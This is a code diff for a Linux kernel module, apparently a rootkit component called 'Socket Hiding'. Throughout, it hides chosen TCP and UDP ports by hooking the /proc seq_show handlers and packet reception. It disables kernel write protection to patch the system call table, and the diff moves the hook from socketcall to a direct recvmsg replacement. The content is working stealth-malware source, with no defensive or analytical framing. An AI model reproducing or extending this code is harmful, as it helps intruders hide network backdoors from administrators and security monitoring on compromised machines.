@@ -50,7 +50,6 @@ int socket_hiding_state = SOCKET_STATE_VISIBLE;
 
 int (*real_tcp4_seq_show)(struct seq_file*, void*);
 int (*real_udp4_seq_show)(struct seq_file*, void*);
-asmlinkage long (*real_socketcall)(int, unsigned long*);
 int (*real_packet_rcv)( struct sk_buff*,
                         struct net_device*,
                         struct packet_type*,
@@ -84,17 +83,14 @@ void parse_socket_port(char* str_port)
     switch (*str_port) {
         case 't':
         case 'T':
-            // printk(KERN_INFO "TCP port: %hd\n", port_no);
             tcp_port_to_hide[num_tcp_port_to_hide++] = port_no;
             break;
         case 'u':
         case 'U':
-            // printk(KERN_INFO "UDP port: %hd\n", port_no);
             udp_port_to_hide[num_udp_port_to_hide++] = port_no;
             break;
         case 'a':
         case 'A':
-            // printk(KERN_INFO "TCP/UDP port: %hd\n", port_no);
             tcp_port_to_hide[num_tcp_port_to_hide++] = port_no;
             udp_port_to_hide[num_udp_port_to_hide++] = port_no;
             break;
@@ -104,7 +100,7 @@ void parse_socket_port(char* str_port)
     return;
 }
 
-void set_socket_ports(char* ports)
+void set_socket_ports(char *ports)
 {
     char *c = ports;
     char *pos = strstr(c, ",");
@@ -124,7 +120,7 @@ void set_socket_ports(char* ports)
     parse_socket_port(c);
 }
 
-inline int check_port_in_list(short port, short* list, int size)
+inline int check_port_in_list(short port, short *list, int size)
 {
     int i;
     for (i = 0; i < size; i++) {
@@ -202,11 +198,11 @@ int fake_udp4_seq_show(struct seq_file *seq, void *v)
 
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
 {
-    struct proc_dir_entry* result = pde->subdir;
-    while(result && strcmp(name, result->name)) {
-        result = result->next;
+    struct proc_dir_entry* ret = pde->subdir;
+    while(ret && strcmp(name, ret->name)) {
+        ret = ret->next;
     }
-    return result;
+    return ret;
 }
 
 asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
@@ -266,19 +262,7 @@ asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
     return ret;
 }
 
-asmlinkage long fake_socketcall(int call, unsigned long __user *args)
-{
-    switch (call) {
-        case SYS_RECVMSG:
-            return fake_recvmsg(args[0], (struct msghdr __user *)args[1], args[2]);
-        default:
-            return real_socketcall(call, args);
-    }
-}
-
-
 int init_module(void){
-    struct kobject *mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
 
     printk(KERN_INFO "Socket Hiding loaded.\n");
     struct net *net_ns;
@@ -309,8 +293,8 @@ int init_module(void){
     }
 
     disable_ro();
-    real_socketcall = syscalls[__NR_socket];
-    syscalls[__NR_socket] = fake_socketcall;
+    real_sys_recvmsg = syscalls[__NR_recvmsg];
+    syscalls[__NR_recvmsg] = fake_recvmsg;
     enable_ro();
 
     socket_hiding_state = SOCKET_STATE_HIDDEN;
@@ -328,7 +312,7 @@ void cleanup_module(void){
     *udp_hook_fn_ptr = real_udp4_seq_show;
 
     disable_ro();
-    syscalls[__NR_socket] = real_socketcall;
+    syscalls[__NR_recvmsg] = real_sys_recvmsg;
     enable_ro();
 
     socket_hiding_state = SOCKET_STATE_VISIBLE;
